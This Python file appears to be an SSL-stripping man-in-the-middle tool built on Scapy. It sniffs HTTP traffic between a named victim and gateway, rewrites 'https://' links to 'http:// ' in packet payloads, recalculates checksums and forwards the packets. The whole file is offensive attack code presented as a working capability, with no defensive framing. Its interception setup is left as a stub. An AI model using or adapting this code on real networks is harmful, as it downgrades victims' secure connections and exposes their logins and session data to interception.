from dataclasses import dataclass
from typing import Optional
import scapy.all as scapy
import re
import sys

@dataclass
class SSLStripConfig:
    iface: str
    victim_ip: Optional[str]
    gateway_ip: Optional[str]
    listen_port: int
    mode: str
    log_file: Optional[str]

def load_arp_watcher_db(path: str = "arp-watcher.db") -> dict[str, str]:
    """Load ARP mappings from local database file."""
    db = {}
    try:
        with open(path, "r") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 2:
                    db[parts[0]] = parts[1]
    except (FileNotFoundError, IOError):
        pass
    return db

def get_mac(ip: str, iface: str, arp_db: Optional[dict[str, str]] = None) -> Optional[str]:
    """Resolve MAC address for a given IP."""
    if arp_db and ip in arp_db:
        return arp_db[ip]

    print(f"[*] IP {ip} not in ARP DB, attempting active resolution...")
    try:
        ans, _ = scapy.srp(scapy.Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst=ip), timeout=2, iface=iface, verbose=False)
        if ans:
            return ans[0][1].src
    except Exception as e:
        print(f"[-] Error resolving MAC for {ip}: {e}")
    return None

def run_ssl_strip(config: SSLStripConfig) -> None:
    """Main entrypoint for SSL stripping capability."""
    print(f"[*] Starting SSL Strip on {config.iface}")
    print(f"[*] Victim: {config.victim_ip} <-> Gateway: {config.gateway_ip}")
    
    if not config.victim_ip or not config.gateway_ip:
        print("[-] Error: Victim IP and Gateway IP are required.")
        return

    arp_db = load_arp_watcher_db()
    print("[*] Resolving MAC addresses...")
    victim_mac = get_mac(config.victim_ip, config.iface, arp_db)
    gateway_mac = get_mac(config.gateway_ip, config.iface, arp_db)
    my_mac = scapy.get_if_hwaddr(config.iface)

    if not victim_mac or not gateway_mac:
        print("[-] Failed to resolve MAC addresses. Ensure targets are reachable.")
        return

    print(f"[*] Resolved: Victim={victim_mac}, Gateway={gateway_mac}")

    start_intercept(config)
    
    # Filter for TCP traffic on port 80 involving our target
    bpf_filter = f"tcp port 80 and (host {config.victim_ip} or host {config.gateway_ip})"
    
    try:
        scapy.sniff(
            iface=config.iface,
            filter=bpf_filter,
            prn=lambda pkt: process_packet(pkt, config, victim_mac, gateway_mac, my_mac),
            store=0
        )
    except KeyboardInterrupt:
        pass
    finally:
        stop_intercept()

def start_intercept(config: SSLStripConfig) -> None:
    """Start the interception pipeline required by the capability."""
    # In a full implementation, we might enable IP forwarding here 
    # or set up iptables rules. For this Scapy implementation, 
    # we assume manual forwarding in process_packet.
    print("[*] Interception started. Press Ctrl+C to stop.")

def stop_intercept() -> None:
    """Stop interception / restore state."""
    print("\n[*] Stopping SSL Strip...")
    sys.exit(0)

def process_packet(pkt, config: SSLStripConfig, victim_mac: str, gateway_mac: str, my_mac: str) -> None:
    """Packet handler used by sniffing/forwarding pipeline."""
    if not pkt.haslayer(scapy.IP) or not pkt.haslayer(scapy.Ether):
        return

    # Avoid processing our own injected packets
    if pkt[scapy.Ether].src == my_mac:
        return

    # Determine forwarding direction
    target_mac = None
    if pkt[scapy.IP].src == config.victim_ip:
        target_mac = gateway_mac
    elif pkt[scapy.IP].src == config.gateway_ip:
        target_mac = victim_mac
    else:
        return

    # Modify Payload if HTTP
    if pkt.haslayer(scapy.TCP) and pkt.haslayer(scapy.Raw):
        payload = pkt[scapy.Raw].load
    
        # Check if it's HTTP traffic
        if b"GET " in payload or b"POST " in payload or b"HTTP/1.1" in payload:
            modified_payload = rewrite_http_payload(payload)
            
            if modified_payload != payload:
                print(f"[+] Stripped SSL from packet: {pkt.summary()}")
                pkt[scapy.Raw].load = modified_payload
                # Recalculate checksums so the packet is valid
                del pkt[scapy.IP].len
                del pkt[scapy.IP].chksum
                del pkt[scapy.TCP].chksum

    # Forward the packet
    pkt[scapy.Ether].dst = target_mac
    pkt[scapy.Ether].src = my_mac
    
    try:
        scapy.sendp(pkt, iface=config.iface, verbose=False)
    except Exception as e:
        print(f"[-] Error forwarding packet: {e}")

def rewrite_http_payload(raw_payload: bytes) -> bytes:
    """Core transformation stage (rewriting logic lives here)."""
    # Simple regex to replace https:// with http://
    # We pad with a space to maintain content length and avoid breaking TCP streams
    # https:// -> http:// 
    # (8 chars)   (7 chars + space)
    
    return re.sub(b'https://', b'http:// ', raw_payload, flags=re.IGNORECASE)
